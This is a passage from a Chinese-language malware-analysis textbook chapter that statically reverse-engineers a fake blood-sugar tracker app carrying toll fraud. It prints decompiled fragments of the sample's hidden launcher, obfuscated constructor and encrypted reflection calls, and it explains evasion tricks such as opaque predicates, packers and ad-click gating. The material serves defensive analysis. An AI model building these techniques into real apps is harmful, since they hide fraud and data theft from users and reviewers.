# 第三章：静态分析**

![Image](img/common.jpg)

本章和下一章通过对两个 2022 年 Android 恶意软件样本（一个收费欺诈应用和一个钓鱼应用）的分析，提供了一种实践性的 Android 恶意软件分析方法。在本章中，我们重点关注静态恶意软件分析和代码阅读。在第四章中，我们讨论动态分析，即在受控环境中运行恶意软件样本以观察其行为。

与其将这些章节视为参考资料，不如将它们看作是实际恶意软件分析的示例，通过这些示例我们介绍了 Android 逆向工程工具并强调了一些最佳实践。本书的作者在过去 10 年中分析了超过 100,000 个 Android 恶意软件样本。在这里，我们分享一些我们所学到的东西，帮助你为自己的分析提供启示。

### **什么是静态代码分析？**

*静态代码分析*（简称 *静态分析*）指的是在不实际执行程序的情况下分析程序以发现其属性的过程。这一策略与接下来章节中介绍的*动态分析*形成对比，在动态分析中，观察的程序会被运行，以观察其运行时行为。

静态分析包括多种技术。你可以将其视为一组推理程序的方式，包括阅读程序代码以及像控制流分析和数据流分析这样的自动化策略，目的是理解程序执行指令的顺序以及数据如何在变量和内存中流动。还有更高级的静态分析技术，如模型检查（用于确认或否定一段代码的属性）和抽象解释（通过模拟执行来探索程序状态），但本书不会涉及这些高级技术。

以下小节提供了一些提高静态分析效率的通用指南。

#### ***引导分析与非引导分析***

在专业的恶意软件分析中，很少会分析一个你完全不了解的随机应用样本。相反，逆向工程师通常会查看特定的应用，以确认或否定之前收集的关于其属性的假设。这些信息可能来自恶意软件扫描器标记你系统上的应用、随机的 X 聊天、分析引擎快速运行的输出，或是相关样本的分析。在这些*引导*场景中，逆向工程师通常知道从哪里开始查看。这里和下一章中的恶意软件分析是*非引导*的，意味着我们在没有任何关于样本的先验信息的情况下开始分析。所有的发现都必须通过检查应用来完成。

尽管在专业环境中，未受指导的反向工程较为少见，但仍然可能发生。在这些情况下，反向工程师应找到避免进行全面代码审查的方法，因为这些方法成本高昂且耗时过长，除非是最重要的恶意软件样本。同时，反向工程师必须保持信心，确保没有重要的恶意软件部分未被发现，即使代码分析是部分进行的。

避免全面代码审查的最简单方法是了解应用程序中使用的 SDK。我们估计，平均每个应用程序中约有 80% 的代码来自第三方 SDK。Android 反向工程师必须具备识别 SDK 的工具；否则，他们将不得不艰难地重新发现本可以通过阅读公开可用的 SDK 文档获得的信息。

#### ***知道何时完成***

在专业环境中，分析的目标决定了你何时完成。如果目标是尽快将应用程序分类为恶意软件并保护用户，恶意软件分析可以非常表面化。例如，对于一个钓鱼应用，你可以在不到一分钟的时间里查看样本，找到它针对银行应用的证据，记录下来，然后继续。如果目标是将恶意功能记录在报告中，或者如果分析是响应客户现场的事件，你可能需要深入分析，花费数天或数周的时间。接下来的章节将着重描述所呈现的恶意软件样本的最重要功能。

经验表明，恶意软件分析师应该迅速行动，以便快速确认应用程序是恶意软件，从而采取措施禁用它，或者行动缓慢，深入调查，并在此过程中学习如何改进他们的工具和流程。在那些不太可能为未来分析提供任何有价值教训的情况下，应避免进行冗长的恶意软件分析。

### **将恶意软件样本加载到 jadx 中**

我们在本章分析的 Android 恶意软件样本是 *com.bp.statis.bloodsugar*（v20，adcf）。该应用伪装成血糖统计跟踪器，于 2022 年 2 月上传到 Google Play，且相当具有现代 Android 恶意软件的代表性。它包含许多反分析技术，从指挥和控制服务器下载远程组件，并滥用移动运营商计费选项进行欺诈性收费。你可以从 [*https://github.com/android-malware-ml-book*](https://github.com/android-malware-ml-book) 下载该文件。

为了阅读应用的代码，我们使用开源的 Android 反向工程工具 *jadx*。该工具可以将 APK、DEX、JAR 等格式的 Android 代码文件转换为可供理解的反编译 Java 代码。此外，jadx 还有许多方便的功能，如重命名变量以及定位变量和方法在代码中出现的位置。它甚至具有高级工具，如调试器、自动化代码去混淆工具和与开源恶意软件分析引擎 Quark Engine 的集成。你可以从 [*https://github.com/skylot/jadx*](https://github.com/skylot/jadx) 下载 jadx。

在 jadx 的图形界面版本中，使用 **文件** ▸ **打开文件** 来打开恶意软件样本进行分析。然后，你应该能在界面左侧的导航树中看到应用的 Java 包结构（图 3-1）。

右侧的大窗口显示了选定 Java 类的反编译代码。

![Image](img/ch03fig01.jpg)

*图 3-1：jadx 主窗口看起来像一个代码 IDE。*

### **权限中的恶意代码**

静态分析的第一步应该是尽快定位到应用中的恶意部分。分析师各有偏好，因为这并不是一门精确的科学。我们将在本节中介绍四种我们常用的选项。第一种方法是查看应用声明将要使用的权限，并弄清楚它可能如何使用这些权限。

当人们考虑 Android 应用的安全性时，权限往往是首先想到的。应用必须声明权限才能使用敏感的 Android API，用户必须在应用访问这些 API 之前授予必要的权限。由于这一权限模型依赖于用户互动和同意，它对所有使用 Android 手机的人来说都非常显眼。然而，无论是用户还是逆向工程师，往往会根据应用声明的权限得出错误的结论。权限系统最终是应用与用户之间的一种绅士协议：应用声明它会为了某个宣传的目的使用某个权限，但操作系统无法检查应用实际上如何使用该权限。

此外，准确地了解应用如何使用权限可能很复杂。应用可以通过反射等技术隐藏这些信息，正如我们在本章稍后所展示的那样。应用还可以通过相互协作，间接访问用户未授予的更多权限。如果一个应用没有发送短信的权限，它可能会请求另一个已安装的应用代表它发送短信。在最坏的情况下，恶意软件甚至可以利用漏洞提升其权限，超出权限系统的边界。

然而，权限仍然是获得未知恶意软件洞察的一种合理方式。与其他应用串通或利用漏洞提升权限的恶意软件比较少见。在没有任何迹象表明你遇到这种恶意软件的情况下，合理的做法是将应用声明的权限视为其能力的限制。

#### ***查看权限***

应用必须在其 *Android Manifest.xml* 文件中声明它们要使用的所有权限，该文件位于 Android 应用 APK 的根文件夹中。图 3-2 显示了我们示例的清单文件的开头，你可以在 jadx 中通过 **Resources** ▸ **AndroidManifest.xml** 来查看它。

![Image](img/ch03fig02.jpg)

*图 3-2：在 jadx 中查看应用权限*

在这里，你可以看到一些应用请求的权限。文件中稍后声明的其他权限在截图中不可见。示例使用 `<uses-permission>` 标签声明其使用以下权限的意图：

+   `INTERNET`

+   `WAKE_LOCK`

+   `RECEIVE_BOOT_COMPLETED`

+   `READ_CONTACTS`

+   `READ_PHONE_STATE`

+   `CHANGE_NETWORK_STATE`

+   `ACCESS_NETWORK_STATE`

+   `BIND_GET_INSTALL_REFERRER_SERVICE`

使用 `<service>` 标签，它还声明了使用这些权限的意图：

+   `BIND_NOTIFICATION_LISTENER_SERVICE`

+   `BIND_JOB_SERVICE`

对于恶意软件分析，并非所有权限都同样重要。例如，`WAKE_LOCK` 权限似乎并不特别有趣，因为它涉及的是保持设备唤醒或从睡眠状态唤醒设备的 API。`INTERNET` 权限也没有什么用处；几乎每个应用都在使用它，因此它不能帮助我们区分恶意应用和良性应用。另一方面，任何以 `READ_` 开头的数据访问权限都可能是值得关注的。例如，为什么一款血糖监测应用需要访问你的联系人列表？

#### ***查找权限控制的 API***

要根据应用声明的权限查找恶意代码，你还需要了解这些权限保护或*控制*哪些 Android API。弄清楚这一点是一个出乎意料的复杂过程，因为目前没有官方的参考资料。多年来，多个学术研究团队尝试创建 Android API 权限图谱，但这也证明很复杂——每个新的 Android 版本都会对权限系统进行更改，因此保持 API 图谱的更新是一项繁琐的工作——不过，这些图谱可以帮助你定位由权限控制的 API。2016 年，萨尔大学和宾夕法尼亚州立大学的研究人员创建了这样的一个图谱，你可以在 [*https://github.com/reddr/axplorer*](https://github.com/reddr/axplorer) 找到它。另一个选项是 2018 年由普渡大学研究人员创建的图谱，你可以在 [*https://arcade-android.github.io/arcade*](https://arcade-android.github.io/arcade) 找到它。

不幸的是，jadx 无法自动显示由权限保护的 API。为了快速定位它们，你可以使用命令行版本的 jadx，然后编写一个脚本来解析其中一个权限映射并将其与应用程序的反编译代码进行比较。随着时间的推移，经验丰富的 Android 逆向工程师应该为这个任务构建一个更强大的解决方案。

另一种定位在成熟应用中受权限保护的 API 的方法是，寻找要求用户同意使用这些权限的代码。例如，你可以搜索包含*permission*的字符串，或者搜索请求权限访问的 API。编写良好的应用应该在准备使用 API 之前请求用户同意，因此相关代码应该就在附近。

#### ***分析 READ_CONTACTS 权限***

`READ_CONTACTS`权限展示了权限映射的另一个问题：在 Android 中，权限不仅仅保护 API。它们还保护作为敏感数据源的内容提供者。虽然上一节提到的权限映射展示了一些在`READ_CONTACTS`权限下非常晦涩的 API，但这个权限通常只是通过内容提供者`content://contacts`或`content://com.android.contacts`提供访问用户的联系人列表。

因此，看到这个权限时，你可能首先会认为它是用来窃取某人的联系人列表信息的。但是，为什么间谍软件应用程序不会同时请求`READ_SMS`、`READ_CALENDAR`和`READ_CALL_LOGS`权限，以窃取短信、日历和通话信息呢？只窃取联系人列表信息的间谍软件确实存在，但它比起窃取更多信息的间谍软件要稀少得多。

在 jadx 中，你可以使用快捷键 CTRL-SHIFT-F 来搜索应用程序的所有代码和资源文件。但是，在我们的示例中，搜索*contact*并禁用大小写敏感性后，仅返回了少数几个结果，包括清单文件中的权限声明。几行代码，位于类中的包名以*androidx.activity*或*com.google.android.gms*开头，看起来是 Google 提供的 API。使用`READ_CONTACTS`来查找恶意功能对于此示例并没有成功。

然而，得出这个权限*不是*恶意使用的结论时，仍然需要注意一些警告。使用`READ_CONTACTS`的恶意代码可能位于加密的代码段中，或者以其他方式隐藏，无法通过我们的手动分析检测到。或者，被描述为 Google API 的代码文件可能已经被注入恶意代码。又或者，这些代码文件与 Google SDKs 无关，而是采用了标准的 Google 类命名模式的恶意代码文件。

这些情况中的任何一种都有可能发生，但我们建议先广泛搜寻，再深入分析。只要你有其他方式在应用中推进，就应该先追踪那些线索，再去探讨那些可能但不太可能的情况，比如被篡改的 Google SDK（尽管它们确实存在于真实的恶意软件中，但在任何单独的恶意软件样本中很少遇到）。本章后面我们将发现，事实上，这个恶意软件最终还是使用了 `READ_CONTACTS` 权限。其使用方式对普通分析是隐藏的。

#### ***分析 BIND_NOTIFICATION_LISTENER_SERVICE 权限***

示例中的另一个有趣权限是 `BIND_NOTIFICATION_LISTENER_SERVICE`，它允许应用访问所有其他应用向用户展示的通知。尽管这个功能看似无害，但恶意软件常常滥用这个权限，因为应用的通知可能包含敏感信息，而恶意软件喜欢窃取这些信息。

这个权限总是与一个接收新通知更新的服务相关联。清单 3-1 展示了我们的示例应用如何声明该权限及其相关服务的使用。

```
<service android:name="com.bp.statis.bloodsugar.PE" 
         android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
  <intent-filter>
    <action android:name="android.service.notification.NotificationListenerService"/>
  </intent-filter>
</service>
```

*清单 3-1：声明通知监听服务，该服务接收关于传入通知的信息*

服务类的名称声明为 `com.bp.statis.bloodsugar.PE`，但是如果你在 jadx 文件浏览器中搜索这个类，你将无法找到它。这一点值得注意。为什么应用会声明一个没有代码可用的服务？这可能是应用的 bug，但在本章后面，我们会发现这个类实际上是隐藏在分析之外的。现在我们暂时无法做什么，因为我们无法找到服务代码。为了简洁起见，其他声明的权限的类似分析留给读者练习。

### **应用入口点中的恶意代码**

Android 应用程序有大量的*入口点*，即 Android 操作系统开始执行应用程序的代码部分。常见的入口点包括导出的活动（包括应用的主活动）；广播接收器，用于处理操作系统或其他应用发送的消息；由应用定义的服务，用于执行长时间运行的操作；以及 `android.app.Application` 类的子类。查看这些入口点的代码可以是发现恶意代码的有效途径，因为有害功能通常喜欢尽早执行，而不是晚些时候。为什么要等用户与应用互动 10 分钟后再窃取他们的信息呢？只要用户启动应用，恶意代码就可以立即开始工作。

然而，并非所有入口点都有同等的可能性藏有恶意代码，我们应该首先考虑那些在恶意软件中更常见的入口点。例如，尽管每个恶意应用和良性应用都有一个主活动，但在主活动中寻找恶意功能可能不是一个好的开始。另一方面，查看用于`BOOT_COMPLETED`事件的广播接收器可能更有前景。恶意软件喜欢在设备上获得持久性，并且让系统在每次设备重启时执行恶意软件是实现这一目标的常见方式。

#### ***导出活动***

在 Android 应用中，*活动*是呈现用户界面的关键机制。它们最好被认为是屏幕或对话框。当用户启动应用时，他们通常首先看到的是主活动。用户与当前活动的互动可能会触发新的活动，比如工作流中的下一步、设置活动或文件共享活动。

并非所有活动都是应用程序的入口点。为了识别这些活动，我们需要区分所谓的*导出活动*和*非导出活动*。在清单文件中标记为`android:exported="true"`的活动可以从应用外部启动，因此被视为入口点。标记为`android:exported="false"`的活动只能从应用内部启动，不能作为入口点。

然而，找到导出活动可能会很棘手。在 Android 12 之前，开发者可以省略活动声明中的`android:exported`标签。在这些情况下，活动的默认值是`true`还是`false`取决于其他配置属性。这让应用开发者感到困惑，并导致了错误和安全漏洞，因为活动可能会意外地被导出，这也是为什么 Android 12 及更高版本要求所有应用活动都必须明确声明的原因。对于为早期版本（Android API 31 之前）开发的应用，我们的建议是学习这些规则，并将其编码到一个小的辅助工具中，以便高亮显示导出活动。否则，逆向工程师可能会犯与应用开发者相同的错误。

我们的示例只声明了一个有趣的活动：它的主活动，如列表 3-2 所示。其他活动是来自 Google SDK 的活动，目前我们认为它们是合法的，并没有被恶意篡改。

```
<activity android:name="com.bp.statis.bloodsugar.MainActivity" 
          android:configChanges="screenSize|orientation">
  <intent-filter>
    <action android:name="android.intent.action.MAIN"/>
    <category android:name="android.intent.category.LAUNCHER"/>
  </intent-filter>
</activity>
```

*列表 3-2：我们示例的主活动声明*

主活动的 XML 声明代码充满了模板代码。对我们来说，唯一重要的部分是活动的名称，`com.bp.statis.bloodsugar.MainActivity`。在 jadx 中双击这个名称会直接带你到它的定义。不幸的是，它由超过 600 行的用户界面代码组成，没有任何有趣的功能。由于该应用没有其他导出活动，因此这一部分没有什么值得进一步查看的内容。

#### ***广播接收器***

Android 中的另一个关键概念是*广播接收器*，它是 Android 消息系统的一部分。所有 Android 应用程序都可以相互或向自己发送消息（广播），而广播接收器负责接收和处理这些传入的消息。

对于逆向工程，广播接收器分为两种不同的类别：它们可以是在清单文件中声明的（所谓的*清单注册接收器*），也可以是在应用程序运行时通过编程注册的（*上下文注册接收器*）。在清单中声明的接收器很容易被发现，因为它们无法被恶意软件分析师隐藏。运行时注册的接收器则不那么容易定位，因为它们可能被加密或混淆的代码隐藏，而这些代码会执行设置接收器所需的 API 调用。

从 Android API 26 开始，系统只使用清单声明的接收器来唤醒应用程序。上下文注册的接收器只能在应用程序已经运行时操作。因此，为了寻找应用程序的入口点，我们应该只考虑清单声明的接收器。

虽然我们示例的清单文件使用 `<receiver>` 标签声明了八个广播接收器，但它们都指向看似来自标准 Google SDK 的类。即使广播接收器在这里似乎没有提供任何有用的入口点，许多恶意软件样本仍然会使用它们。例如，注册接收 `BOOT_COMPLETED` 消息是一种常见的恶意软件在系统重启后重新运行的方式。在本章后面，你还会看到我们的示例为上下文注册的接收器设置了没有在清单文件中找到的痕迹。特别是，恶意软件注册了一个 `RECEIVE_SMS` 接收器，用于拦截传入的短信并窃取一次性密码。

#### ***服务***

*服务*是应用程序在后台执行长时间运行操作的默认方式。开发人员必须在应用程序的清单文件中声明所有服务，使它们容易被发现。尽管服务不是应用程序的入口点（所有服务必须由正在运行的应用程序本身启动），但它们是逆向工程的良好入口点，因为服务类声明无法被隐藏或混淆，并且它们的代码形成了可以单独分析的独立功能单元。许多恶意软件样本使用这些服务执行恶意操作，因此寻找服务入口点是发现此类代码的快速方式。

我们的示例声明了九个服务，其中八个似乎仍属于 Google SDK。剩下的一个服务是 `com.bp.statis.bloodsugar.PE`，我们在分析权限时曾讨论过。该服务接收并拦截系统中所有应用程序的传入通知。

#### ***应用程序子类***

其他合法的 Android 应用入口点，虽然有些晦涩，是`android.app.Application`类的子类。默认情况下，所有 Android 应用都有这个 Java 类的实现。需要偏离默认应用行为的应用可以继承这个默认类。如果一个应用使用了这样的子类，你可以在清单文件的`<application>`标签中找到它的名称。

我们的示例确实声明了默认`android.app.Application`实现的一个子类。在`<application>`标签中，你应该看到如下声明，其中`android:name`属性指定的完全限定名覆盖了默认类：

```
android:name="androidx.multidex.MultiDexApplication"
```

根据其路径名，`androidx.multidex.MultiDexApplication`类似乎来自一个默认的 Google SDK。通过深入官方文档，可以了解到它是为了绕过大型应用的大小限制而引入的。根据我们的经验，现在越来越多的应用程序使用这个属性，所以看到它是非常常见的。

然而，我们的示例已经恶意地修改了这个类。在 jadx 中双击类名会打开清单 3-3 中的代码。

```
package androidx.multidex;

import android.app.Application;
import android.content.Context;
import d.b;

/* loaded from: classes.dex */
public class MultiDexApplication extends Application {
  @Override // android.app.Application
  public void onCreate() {
    super.onCreate();
    new b(this).o();
  }

  @Override // android.content.ContextWrapper
  protected void attachBaseContext(Context context) {
    super.attachBaseContext(context);
    MultiDex.install(this);
  }
}
```

*清单 3-3：恶意代码从一个 android.app.Application 子类启动。*

大部分代码都是模板代码，只有`new b(this).o()`这一行比较特殊。创建`d.b`类的对象并调用它的方法`o`是非常不寻常的。在 jadx 中双击`d`或`o`会带你到严重混淆的代码。我们稍后将回顾这段代码。

### **隐藏恶意代码**

如果我们还没有找到进入恶意代码的钩子，另一种选择是寻找反分析技术和试图隐藏代码的手段。这项技术有用，部分原因是恶意代码通常试图隐藏，以及因为这种分析可以拓宽我们对应用的理解，确保我们不会遗漏其关键功能。

从高层次来看，我们建议寻找以下常见的策略：动态和静态反分析技术、反射及其他动态代码加载技术、非 Java 代码的使用，以及加密和混淆。

#### ***反分析技术***

反分析技术旨在让静态或动态分析变得困难，并且有多种形式。大多数恶意软件都包含至少几种这些措施，以使恶意软件分析师更难理解样本，以及判断它是否可能在被监视或运行在真实用户的设备上。

发现并理解反分析技术本身就是一门学问。一个入门的方式是阅读 MITRE ATT&CK 框架中的“防御规避”部分，这是一个免费的标准，用于记录恶意软件技术。随着时间的推移，我们建议逆向工程师构建工具来识别应用中的反分析技术。手动做这项工作是困难且耗时的，因为有成百上千种反分析技术存在，并且它们已经公开记录。

静态分析在检测动态反分析技术方面尤其有用。旨在破坏动态分析的反分析技术通常聚焦于理解恶意软件运行的环境。有些技术试图检测分析工具，如模拟器、调试器或沙箱，并避免在检测到这些工具时运行。另一些技术则利用设备的环境属性，尝试判断它们是否在安全分析系统中运行。例如，它们可能会等待一段时间后再执行恶意功能。它们也可能关注设备的地理属性，例如找出设备是否位于某个特定国家或连接到某个特定的移动运营商。一些恶意软件会检查设备的语言或用户的时区。

更智能的恶意软件应用使用更复杂的方法，考虑来自设备外部的信息。例如，我们曾见过一些应用会检查它们是否仍然在 Google Play 上发布，或者它们的服务器连接是否来自某个特定国家的 IP 范围。如今，尤其常见的一种技术是检查应用是否通过恶意软件作者支付的广告点击安装。如果用户是通过这个广告安装的应用，应用才会执行恶意功能；那些没有通过点击广告安装该应用的自动化安全工具将无法触发其恶意负载。如果广告活动的某些属性被用作后续阶段代码的解密密钥，这项技术可能会变得复杂。如果没有广告点击的信息，你可能无法解密部分恶意代码。

静态反分析技术的重点是拒绝静态分析工具检查和理解代码。在 Android 恶意软件中，这通常意味着隐藏代码、加密代码或在后期阶段加载代码，以确保代码完全无法进行静态分析。此外，Android 恶意软件通常使用商业或免费提供的 *应用打包工具*，这些工具可以对应用进行加密或压缩其原始代码。市场上有许多现成的 Android 应用打包工具，通常以保护知识产权为目的进行营销。在中国，这些工具用于保护 Android 应用的情况尤其广泛，许多可用的应用打包工具也源自中国。

这些工具通常应用复杂的静态反分析技术。为了使原始代码更难理解，它们可能会实现控制流混淆（通过应用程序混淆代码的原始流向）或数据流混淆（让跟踪变量之间如何交互变得更加困难）。最复杂的应用打包工具甚至会将原始应用代码重新编译成它们自己的自定义代码。理解这种转化后的代码需要了解由打包工具定义的字节码及其解释器的抽象机器。

#### ***反思***

反射是另一种常见的反分析技术。许多现代 Android 恶意软件样本将恶意功能分割成多个动态加载的阶段，这些阶段像插件一样运行。通常，第一阶段直接嵌入到应用程序中，体积小且无害。它通常什么也不做，只是观察它的运行时环境。如果它没有检测到任何分析工具，它就会加载第二阶段，第二阶段包含更多的恶意功能。

Java 反射 API，定义在 Java 包 *java.lang.reflect* 中，用于动态查找、实例化和调用类和方法。它们允许应用程序动态加载在编译时可能不存在的代码，例如插件。良性的应用程序也常常使用这些 API。例如，它们可能加载良性的插件，或根据当前的操作系统版本在不同的 API 之间进行选择，或访问本应对应用程序隐藏的私有 API。

然而，在恶意软件分析中，寻找反射 API 是有效的，因为反射的使用无法被隐藏。而且，区分反射的良性和恶意使用通常是很容易的。在几乎所有情况下，良性的反射都会提供恒定的参数给反射 API。例如，应用程序可能通过名称查找私有的 Android API。恶意反射通常使用非恒定参数，这些参数在运行时拼接在一起，或者是加密或混淆的字符串，它会在传递给反射 API 之前解码。这使得人工审查员可以很容易地快速筛选出反射的使用，并找到最有可能是恶意的那些。

在反编译的 jadx 代码中，所有使用反射的类都以导入反射 API 的语句开始，因此使用搜索对话框查找 `import java.lang.reflect` 应该能返回所有这些类。在我们的示例应用程序中，搜索对话框返回了 293 个结果，显示出反射的常见程度。假设标准 SDK 类没有被恶意修改，我们可以丢弃所有位于 Java 包 *androidx.**、*kotlin.** 和 *com.google.** 下的结果。这时剩下的几个结果则出现在以 *b.**、*d.** 和 *e.** 开头的包中。我们已经将 *d.** 包识别为可能含有恶意代码的候选包，所以先查看另外两个包。

随机选择的类 `b.j.k` 展示了一个可能是良性的反射代码示例。如 清单 3-4 所示，反射代码尝试加载一个类，其名称包含字符串 `_LifecycleAdapter`。这段代码看起来没有混淆或足够动态，因此不太可能是恶意反射。

```
public static String b(String str) {
  return str.replace(".", "_") + "_LifecycleAdapter";
}

public static int c(Class<?> cls) {
  ...
  String b2 = b(canonicalName);
  if (!name.isEmpty()) {
    b2 = name + "." + b2;
  }
  constructor = Class.forName(b2).getDeclaredConstructor(cls);
  ...
}
```

*清单 3-4：应用程序中良性的反射使用*

更重要的是，该类包含两个重要字符串：`_LifecycleAdapter`和`The observer class has some methods that use newer...`，后者为了简洁起见我们在列表中省略了。快速的网络搜索显示，这些字符串来自一个标准的 Android 类`androidx.lifecycle.ClassesInfoCache`，意味着这段代码很可能是无害的。

大多数代码混淆器在将原始代码转化为混淆代码时，保持了包层次结构不变。因此，在混淆代码中的兄弟包很可能也是原始代码中的兄弟包。如果类`b.j.k`是`androidx.lifecycle.ClassesInfoCache`，那么所有属于包*b.j*的类很可能都属于`androidx.lifecycle`，并且包*b.**中的所有类也很可能都属于`androidx.*`。我们现在假设这一点，声明在*b.**中使用反射的所有代码是安全的，然后继续进行。对在*e.**包中发现的反射代码进行类似分析，表明这也很可能是一个标准库。

除了*java.lang.reflect*包中的 Java 反射 API，Android 还提供了一些其他的代码加载 API，这些 API 被良性和恶意应用程序都常常使用。最常见的两个 API 是`dalvik.system.DexClassLoader`和`dalvik.system.DexFile`（在 Android API 26 中已废弃）。这些 API 可以加载整个 Android 代码文件，并且经常用于加载插件。Java 和 Android 还有其他相关的 API，通常被称为*ClassLoader API*。我们建议开发者理解这些 API，或者更好的是，开发一个自动化工具来在应用中检测它们。尤其是从内存中的字节数组而非磁盘文件加载代码的 API 在 Android 恶意软件中变得越来越流行。通过这种技术，恶意软件可以避免留下安全研究人员可能发现的痕迹。

尝试在我们的示例应用程序中搜索`dalvik.system.Dex`。它应该仅在标准 SDK 之外返回一个使用，再次出现在可能恶意的*d.**包中。

#### ***非 Java 代码***

现代 Android 应用程序可以用除了 Java 以外的许多编程语言和框架编写。比如 Flutter、Kotlin、Xamarin.Android 和 ReactNative。恶意软件开发者故意使用这些新技术来使恶意软件分析更加困难。

一些恶意软件开发者已经开始完全使用这些语言来构建恶意软件。这个简单的选择已经使分析变得更加困难，因为大多数 Android 逆向工程师可能拥有很好的 Java 应用分析工具，但对于用其他语言编写的应用并没有相应的工具。其他恶意软件开发者则继续使用 Java 作为主要编程语言，同时战略性地使用其他语言开发恶意部分。为了检测这些恶意活动，自动化分析工具需要能够理解不同语言编写的代码部分之间的控制流和数据流。

我们看到恶意软件策略性使用的两种最常见编程语言是 JavaScript 和原生 ARM 代码。JavaScript 更可能作为与网站交互的方式使用，而非纯粹的反分析技术。原生 ARM 代码是使用 C、C++ 或其他编译成 ARM 代码的语言开发的，通常用于隐藏恶意功能。例如，恶意软件常常会发布只包含单一解密例程的原生代码二进制文件，这个解密例程是通过 Java 代码调用的。

我们建议在 Android 恶意软件分析中寻找替代语言，特别关注 JavaScript 和原生 ARM 代码。恶意软件应用可能会隐藏这些替代语言的使用，但它们通常会留下明显的痕迹。例如，你经常可以在 APK 文件的 *lib* 文件夹中找到原生代码。用于与原生代码交互的 Java 关键字，如 `native` 或 API `System.loadLibrary`，也提供了强烈的指示，表明应用使用了原生 ARM 代码。查找 WebView 对象中的 JavaScript，特别是那些通过 API `addJavascriptInterface` 声明 JavaScript 接口的对象。

我们的样本中没有明显的指示表明使用了原生 ARM 代码或 JavaScript。没有原生代码资产文件，也没有使用上述提到的任何 API，或者任何能暗示它们存在的关键字。稍后，你将了解到应用确实使用了 JavaScript，但这种使用是隐藏的，难以发现。

#### ***加密与编码***

恶意软件开发者喜欢加密和编码字符串。实际上，使用加密 API 可以提供恶意功能位置的线索。恶意软件开发者通常会使用 *javax.crypto* 包中的默认 Java 加密算法实现，比如 AES 或 RSA。使用 *java.util.Base64* 或 *android.util.Base64* 也很常见。查找对这些包的引用可以帮助你快速定位有趣的方法，例如那些解密从命令控制服务器接收到的通信。然而，除了在无害的 Google SDK 中，我们的样本并没有明显使用 *javax.crypto* 中的任何 API。它更多地使用 *java.util.Base64*，包括在之前声明为无害的混淆包 *b.** 中。

当逆向工程师遇到瓶颈时，他们可能会开始查看应用中的字符串和方法名称，希望能发现有趣的线索。这项技术只需几分钟时间，可能会带来新的发现。例如，恶意软件开发者可能忘记删除敏感的日志字符串，或者搜索可能会揭示出一个读取用户短信的 API 调用。

然而，如果没有精心的规划，搜索字符串和方法名称可能会浪费时间，因为这更多依赖于运气而非专业知识。为了构建搜索结构，你可以开发一个正则表达式，返回所有你能想到的有趣的字符串和方法名称。例如，这可能包括短信或联系人列表 API 的名称，以及匹配 URL 或有趣内容提供者的字符串。正则表达式不必完美才有用；随着你发现更多有趣的 API 和字符串模式，你可以逐步完善它。在我们的示例中，例如，搜索可疑的字符串和 API 名称返回了我们之前识别的恶意 *d.** 包中的一个 URL。

### **恶意软件的第一阶段**

到目前为止，我们已经在本章中多次遇到可疑的 *d.** 包。现在是时候分析它了。这个包结构非常简单，只有两个类，`d.a` 和 `d.b`。有趣的是，应用程序似乎根本没有使用 `d.a`，而 `d.b` 直接从 `android.app.Application` 子类的应用程序入口点执行。

目前不清楚为什么 `d.a` 会出现在应用程序中。开发者可能在测试时使用了该类，并且忘记在发布恶意软件前将其移除。它的代码似乎没有被引用或调用，它的功能有限且未被混淆，并且包含了一个以明文形式呈现的命令与控制服务器的 URL。从这个文件连接到该 URL 会下载另一个包含更多恶意内容的代码文件。

`d.b` 类是应用程序恶意功能的第一部分。我们已经知道它的构造函数和方法 `o` 一启动应用程序就会运行。检查该类还会发现强烈的代码混淆和加密，例如在示例 3-5 中所示，那里展示了该类唯一的构造函数。

```
public b(Context context) {
  super(context);
  this.f854g = "3AYdz"; 
  this.h = 9694;
  this.n = 6249;
  if (Build.VERSION.SDK_INT == 93) {
    this.h = PointerIconCompat.TYPE_TEXT;
    this.f854g = (this.w + this.i).substring(0, this.i.length());
    this.n = (this.D / 6900) + ((this.x + this.h) / 7607);
    d(null);
    return;
  }
  this.h = 59;
}
```

*示例 3-5：恶意软件类 d.b 的构造函数*

构造函数代码包含了在类的其他地方发现的几种混淆技术。例如，许多属性被赋予看似随意的字符串和整数值。这些值看起来像是被混淆或加密了。代码中还有复杂的算术表达式和不透明的谓词。*不透明的谓词*是那些计算结果为真或假的表达式，虽然看起来计算复杂，但总是解析为相同的值。恶意软件利用它们来混淆人工和自动化分析，例如，通过使得 `if` 语句的分支或循环语句的重复变得更难以跟踪。

`d.b` 类使用了两种类型的不透明谓词条件，其中一种在示例 3-5 中的 `if` 语句中展示，比较了 Android SDK 版本与 93\. 这个检查是没有意义的；截至目前，我们离 API 级别 93 还有 60 多个版本（以及很多年）。目前，这个表达式将永远返回 false，`if` 块中的指令将永远不会执行。

该类中的第二个不透明谓词条件使用了 Java 的 `java.util.Calendar` API，如列表 3-6 所示。

```
if (Calendar.getInstance().get(4) >= 196) {
```

*列表 3-6：恶意类 d.b 使用 Calendar API 构造不透明谓词。*

这段代码请求系统默认日历获取当前月份中当前周的编号。此 API 的返回值必须介于 0 和 6 之间，因此该表达式永远不会为真，这样 `if` 块中的指令也永远不会执行。

#### ***理解恶意类***

我们现在已经识别出 `d.b` 中用于增加分析难度的技术，但我们仍然需要破解它们，以理解恶意软件的行为。幸运的是，恶意软件的作者犯了一些关键性的错误，我们可以加以利用。如果没有这些错误，我们可能不得不翻阅近 1,000 行难以阅读的代码。

开发者的第一个错误是重复使用相同的几种技术。对于不透明谓词来说，很容易判断检查的是合法的 API 版本还是现实的日历日期。看似随机的值赋给属性的算术表达式和赋值也都非常相似。作为人工审查者，你可以利用大脑的模式识别能力，快速扫描代码，找到那些在视觉上不同的指令。在下一节中，当我们重建该类的字符串解密算法时，你会发现这些不同的指令实际上是唯一重要的。

开发者的第二个错误是将字符串保留在类中。尽管他们将这些字符串混淆到几乎无法辨认的程度，但它们仍然保留在传递给标准 API 的确切位置，如列表 3-7 所示。

```
return cls.getMethod(
  p("qmqMRa3e34OrqtqLdSAnAjne4p4ssoXYOMh"),
  new Class[0]).invoke(newInstance, new Object[0]);
```

*列表 3-7：恶意类 d.b 加密字符串，但将其保留在原地。*

由于反射 API 需要一个未混淆的明文字符串才能工作，因此很明显，`p` 方法返回的就是那个字符串。此外，`p` 方法的参数很可能是经过混淆和加密的字符串，而 `p` 方法将其解密为 `getMethod` API 所期望的类方法名称字符串。

#### ***逆向工程字符串解密方法***

